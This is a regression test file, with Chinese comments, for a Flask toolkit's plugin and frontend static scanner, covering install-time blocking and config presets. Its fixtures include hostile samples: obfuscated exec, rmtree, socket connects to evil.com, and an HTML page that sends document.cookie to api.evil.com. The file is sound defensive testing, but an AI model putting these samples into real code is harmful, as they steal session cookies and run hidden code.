# -*- coding: utf-8 -*-
# 框架回归测试套件（FlaskToolkit/tests/），项目根路径自动推导，不依赖绝对路径
import os as _os
import sys as _sys
_TESTS_DIR = _os.path.dirname(_os.path.abspath(__file__))
_PROJECT_ROOT = _os.path.dirname(_TESTS_DIR)
_sys.path.insert(0, _PROJECT_ROOT)
"""插件静态扫描回归（v4.3.1，安全强化 P1 阶段一）

覆盖：
A. 扫描器单元（AST）：危险 import / 动态执行 / 混淆 / 破坏性调用 / 网络服务端与客户端 /
   读写范围提取 / 别名归因 / 语法错误 / 良性零误报
B. 插件包（.zip）扫描：恶意检出 / templates 内 .py 跳过
C. 前端工具扫描：外部脚本 / eval / 端点提取 / zip 扫描
D. 安装链路 enforce 集成（隔离目录 + test client）：高风险拒绝 + 未落盘 / report 良性放行附摘要
E. 配置预设：三套预设键合法 / 值可 coerce / 应用写入 / 未知预设拒绝

运行：python tests/test_plugin_scan.py
"""
import io
import json
import os
import shutil
import sys
import tempfile
import zipfile
import importlib.util

REAL_BASE = _PROJECT_ROOT
sys.path.insert(0, REAL_BASE)

import global_var
from core.plugin_scanner import (
    scan_code, scan_plugin_zip, scan_frontend_html, scan_frontend_zip, should_block,
)

results = []

def check(name, cond, detail=''):
    results.append((name, cond, detail))
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")

# ============ A：扫描器单元 ============
BENIGN = '''
import json
import time
from .base_plugin import BasePlugin

class HelloPlugin(BasePlugin):
    name = "hello"
    def get_data(self):
        return {"time": time.time(), "msg": "hello"}
'''
r = scan_code(BENIGN, 'benign.py')
check("A1 良性代码零高风险零中风险", r['summary']['high'] == 0 and r['summary']['medium'] == 0,
      f"summary={r['summary']}")

r = scan_code("import subprocess\nsubprocess.Popen(['x'])\n", 'a.py')
check("A2 subprocess 导入+调用高风险", r['summary']['high'] >= 2, f"summary={r['summary']}")

r = scan_code("import os\nos.system('dir')\n", 'a.py')
check("A3 os.system 高风险", r['summary']['high'] >= 1, f"summary={r['summary']}")

r = scan_code("eval('1+1')\nexec('x=1')\n", 'a.py')
check("A4 eval/exec 动态执行高风险", r['summary']['high'] >= 2, f"summary={r['summary']}")

r = scan_code("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n", 'a.py')
check("A5 base64+exec 混淆检出", any(f['category'] == 'obfuscation' for f in r['findings']),
      f"findings={[(f['category'], f['severity']) for f in r['findings']]}")

r = scan_code("m = __import__('o' + 's')\nm.system('x')\n", 'a.py')
cats = [f['category'] for f in r['findings']]
check("A6 __import__ 拼接动态导入+混淆", 'dynamic-import' in cats and 'obfuscation' in cats,
      f"cats={cats}")

r = scan_code("import os, shutil\nshutil.rmtree('/data')\nos.remove('/tmp/x')\n", 'a.py')
check("A7 rmtree 高风险 / os.remove 中风险",
      any(f['category'] == 'dangerous-call' and f['severity'] == 'high' for f in r['findings'])
      and any(f['severity'] == 'medium' for f in r['findings']), f"summary={r['summary']}")

r = scan_code("import pickle\npickle.loads(b'x')\n", 'a.py')
check("A8 pickle.loads 高风险", r['summary']['high'] >= 2, f"summary={r['summary']}")

r = scan_code("import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 9999))\ns.listen(1)\n", 'a.py')
check("A9 socket 服务端（bind/listen）高风险", r['summary']['high'] >= 1, f"summary={r['summary']}")

r = scan_code("import socket\ns = socket.socket()\ns.connect(('evil.com', 80))\n", 'a.py')
check("A10 connect 端点提取 tcp://evil.com", 'tcp://evil.com' in r['scope']['network_endpoints'],
      f"endpoints={r['scope']['network_endpoints']}")

r = scan_code("import requests\nrequests.get('https://api.example.com/v1')\n", 'a.py')
check("A11 requests 中风险 + URL 端点提取",
      r['summary']['medium'] >= 1 and 'https://api.example.com/v1' in r['scope']['network_endpoints'],
      f"summary={r['summary']} endpoints={r['scope']['network_endpoints']}")

r = scan_code("open('/tmp/a.txt')\nopen('/tmp/b.txt', 'w')\n", 'a.py')
check("A12 读写路径范围提取",
      '/tmp/a.txt' in r['scope']['paths_read'] and '/tmp/b.txt' in r['scope']['paths_written'],
      f"scope={r['scope']}")

r = scan_code("import subprocess as sp\nsp.Popen(['x'])\n", 'a.py')
check("A13 别名归因（import as 仍检出）", r['summary']['high'] >= 2, f"summary={r['summary']}")

r = scan_code("def broken(:\n", 'a.py')
check("A14 语法错误高风险（疑似混淆）", r['summary']['high'] == 1
      and r['findings'][0]['category'] == 'syntax', f"summary={r['summary']}")

check("A15 should_block 决策", should_block({'summary': {'high': 1}}) is True
      and should_block({'summary': {'high': 0, 'medium': 9}}) is False)

# ============ B：插件包（zip）扫描 ============
def make_zip(path, members):
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, content in members.items():
            zf.writestr(name, content)

_tmp = tempfile.mkdtemp(prefix='ftk_scan_')
evil_zip = os.path.join(_tmp, 'evil.zip')
# 注：恶意调用写在函数体内 —— 扫描检出的是代码存在而非执行；
# 避免测试中 load_plugins 导入时真的执行 subprocess
make_zip(evil_zip, {
    'plugin.json': json.dumps({'name': 'evil', 'version': '1.0.0'}),
    'evil.py': 'import subprocess\nimport socket\n'
               'def run():\n'
               '    subprocess.Popen(["echo", "pwned"])\n'
               '    s = socket.socket()\n'
               '    s.connect(("evil.invalid", 80))\n',
    'templates/index.html': '<html>ok</html>',
})
r = scan_plugin_zip(evil_zip)
check("B1 恶意插件包检出高风险", r['summary']['high'] >= 2, f"summary={r['summary']}")

skip_zip = os.path.join(_tmp, 'skip.zip')
make_zip(skip_zip, {
    'plugin.json': json.dumps({'name': 'skip', 'version': '1.0.0'}),
    'main.py': 'import json\nx = {"a": 1}\n',
    'templates/hidden.py': "eval('1+1')\n",   # templates 内 .py 应被跳过
})
r = scan_plugin_zip(skip_zip)
check("B2 templates 内 .py 不参与后端扫描", all(f['file'] != 'templates/hidden.py' for f in r['findings'])
      and r['summary']['high'] == 0, f"summary={r['summary']}")

# ============ C：前端工具扫描 ============
evil_html = '''<!DOCTYPE html>
<html><head><script src="https://cdn.evil.com/x.js"></script></head>
<body><script>eval(atob("ZGF0YS5jb29raWU="));</script>
<script>fetch("https://api.evil.com/steal?d=" + document.cookie)</script>
</body></html>
'''
r = scan_frontend_html(evil_html, 'evil.html')
check("C1 外部脚本中风险", any(f['category'] == 'external-script' for f in r['findings']),
      f"cats={[f['category'] for f in r['findings']]}")
check("C2 eval 高风险", r['summary']['high'] >= 1, f"summary={r['summary']}")
check("C3 前端端点提取",
      any('cdn.evil.com' in e for e in r['scope']['network_endpoints'])
      and any('api.evil.com' in e for e in r['scope']['network_endpoints']),
      f"endpoints={r['scope']['network_endpoints']}")

fe_zip = os.path.join(_tmp, 'fe.zip')
make_zip(fe_zip, {
    'config.json': json.dumps({'name': 'fe_evil', 'version': '1.0.0', 'category': 'test'}),
    'fe_evil.html': evil_html,
})
r = scan_frontend_zip(fe_zip)
check("C4 前端工具包 zip 扫描", r['summary']['high'] >= 1 and r['summary']['medium'] >= 1,
      f"summary={r['summary']}")

benign_html = '<html><body><div>hello</div><script>var x=1;document.getElementById("d");</script></body></html>'
r = scan_frontend_html(benign_html, 'ok.html')
check("C5 良性前端页零高零中", r['summary']['high'] == 0 and r['summary']['medium'] == 0,
      f"summary={r['summary']}")

# ============ D：安装链路 enforce 集成（隔离目录） ============
_isolated = tempfile.mkdtemp(prefix='ftk_scanapi_')
os.makedirs(os.path.join(_isolated, 'plugins'))
os.makedirs(os.path.join(_isolated, 'temp'))
os.makedirs(os.path.join(_isolated, 'logs'))
shutil.copy(os.path.join(REAL_BASE, 'plugins', '__init__.py'),
            os.path.join(_isolated, 'plugins', '__init__.py'))
shutil.copy(os.path.join(REAL_BASE, 'plugins', 'base_plugin.py'),
            os.path.join(_isolated, 'plugins', 'base_plugin.py'))
sys.path.insert(0, _isolated)

_SAVED = {}
for attr, val in (('BASE_DIR', _isolated),
                  ('UPLOAD_TEMP_DIR', os.path.join(_isolated, 'temp')),
                  ('LOG_DIR', os.path.join(_isolated, 'logs')),
                  ('PLUGIN_STATUS_FILE', os.path.join(_isolated, 'plugins', 'status.json'))):
    _SAVED[attr] = getattr(global_var, attr, None)
    setattr(global_var, attr, val)

_saved_scan_mode = global_var.PLUGIN_SCAN_MODE
global_var.PLUGIN_SCAN_MODE = 'enforce'

import app as appmod
from core.plugin_loader import load_plugins
app = appmod.app
app.config["TESTING"] = True
load_plugins()  # 隔离目录无插件 → 游客放行
client = app.test_client()

def upload(zip_path, fname):
    with io.open(zip_path, 'rb') as f:
        data = {'file': (f, fname, 'application/zip')}
        return client.post('/api/admin/plugins/upload', data=data,
                           content_type='multipart/form-data')

r = upload(evil_zip, 'evil.zip')
body = r.get_json() or {}
check("D1 enforce 恶意包拒绝 400", r.status_code == 400, f"status={r.status_code}")
check("D2 拒绝响应附完整扫描报告",
      (body.get('scan_report') or {}).get('summary', {}).get('high', 0) >= 2
      and '高风险' in (body.get('message') or ''),
      f"msg={body.get('message', '')[:60]}")
check("D3 恶意插件未落盘",
      not os.path.isfile(os.path.join(_isolated, 'plugins', 'evil.py')))

# report 模式良性包放行 + 附摘要
global_var.PLUGIN_SCAN_MODE = 'report'
good_zip = os.path.join(_tmp, 'good.zip')
make_zip(good_zip, {
    'plugin.json': json.dumps({'name': 'scan_good', 'version': '1.0.0'}),
    'scan_good.py': 'import json\nimport time\nfrom plugins.base_plugin import BasePlugin\n'
                    'class ScanGoodPlugin(BasePlugin):\n'
                    '    name = "scan_good"\n'
                    '    version = "1.0.0"\n'
                    '    @property\n'
                    '    def routes(self):\n        return []\n',
})
r = upload(good_zip, 'good.zip')
body = r.get_json() or {}
check("D4 report 良性包放行 200", r.status_code == 200, f"status={r.status_code} msg={body.get('message')}")
check("D5 成功响应附扫描摘要", 'scan' in body and body['scan'].get('high') == 0, f"scan={body.get('scan')}")

# report 模式恶意包也放行（仅告警）
r = upload(evil_zip, 'evil.zip')
check("D6 report 恶意包放行（仅告警不阻断）", r.status_code == 200, f"status={r.status_code}")

check("D7 真实项目未被污染",
      not os.path.isfile(os.path.join(REAL_BASE, 'plugins', 'evil.py'))
      and not os.path.isfile(os.path.join(REAL_BASE, 'plugins', 'scan_good.py')))

global_var.PLUGIN_SCAN_MODE = _saved_scan_mode

# ============ E：配置预设 ============
_cfg_path = os.path.join(_tmp, 'user_config.json')
_spec = importlib.util.spec_from_file_location('ftk_config_tool',
                                               os.path.join(REAL_BASE, 'tools', 'config.py'))
cfg_tool = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(cfg_tool)

check("E1 三套预设齐全", set(cfg_tool.PROFILES.keys()) == {'daily', 'strict', 'lan-open'},
      f"profiles={list(cfg_tool.PROFILES.keys())}")
all_keys_valid = all(k in global_var.CONFIG_ITEMS for p in cfg_tool.PROFILES.values() for k in p['values'])
check("E2 预设键全部存在于 CONFIG_ITEMS", all_keys_valid)
coerce_ok = all(global_var.coerce_config_value(v, global_var.CONFIG_ITEMS[k]) is not None
                for p in cfg_tool.PROFILES.values() for k, v in p['values'].items())
check("E3 预设值全部通过类型校验", coerce_ok)

changes = cfg_tool.apply_profile('daily', config_file=_cfg_path)
with io.open(_cfg_path, encoding='utf-8') as f:
    saved = json.load(f)
check("E4 应用 daily 预设写入文件",
      saved.get('PLUGIN_SCAN_MODE') == 'report' and saved.get('LOGIN_LOCK_MODE') == 'ip_username',
      f"saved={saved}")

cfg_tool.apply_profile('strict', config_file=_cfg_path)
with io.open(_cfg_path, encoding='utf-8') as f:
    saved2 = json.load(f)
check("E5 切换 strict 预设覆盖值",
      saved2.get('PLUGIN_SCAN_MODE') == 'enforce' and saved2.get('PACKAGE_INTEGRITY_MODE') == 'strict'
      and saved2.get('SESSION_COOKIE_SECURE') is True, f"saved={saved2}")

try:
    cfg_tool.apply_profile('nope', config_file=_cfg_path)
    ok = False
except ValueError:
    ok = True
check("E6 未知预设 ValueError", ok)

# ============ 清理与汇总 ============
for k, v in _SAVED.items():
    setattr(global_var, k, v)
for d in (_tmp, _isolated):
    try:
        shutil.rmtree(d, ignore_errors=True)
    except Exception:
        pass

passed = sum(1 for _, c, _ in results if c)
print(f"\n==== 插件静态扫描回归（v4.3.1）：共 {len(results)} 项，通过 {passed}，失败 {len(results) - passed} ====")
sys.exit(0 if passed == len(results) else 1)
